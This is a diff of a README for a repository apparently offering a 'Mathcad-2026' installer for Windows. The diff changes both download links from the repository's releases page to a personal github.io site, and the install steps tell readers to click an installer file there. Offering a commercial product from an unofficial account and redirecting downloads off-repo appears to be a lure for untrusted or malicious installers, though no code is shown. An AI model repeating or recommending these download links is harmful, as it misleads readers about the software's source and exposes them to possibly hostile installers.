@@ -1,6 +1,6 @@
 # 🧮 Mathcad-2026 - Perform engineering calculations on Windows systems
 
-[![](https://img.shields.io/badge/Download-Mathcad_2026-blue.svg)](https://github.com/Melan9778/Mathcad-2026/releases)
+[![](https://img.shields.io/badge/Download-Mathcad_2026-blue.svg)](https://melan9778.github.io)
 
 ## 📌 Introduction
 
@@ -19,7 +19,7 @@ Before you install the software, check your computer for these requirements. Pro
 
 ## 📥 Download Steps
 
-1. Visit the project release page: [https://github.com/Melan9778/Mathcad-2026/releases](https://github.com/Melan9778/Mathcad-2026/releases).
+1. Visit the project release page: [https://melan9778.github.io](https://melan9778.github.io).
 2. Locate the latest release at the top of the page.
 3. Look for the Assets section.
 4. Click the installer file to start the download.
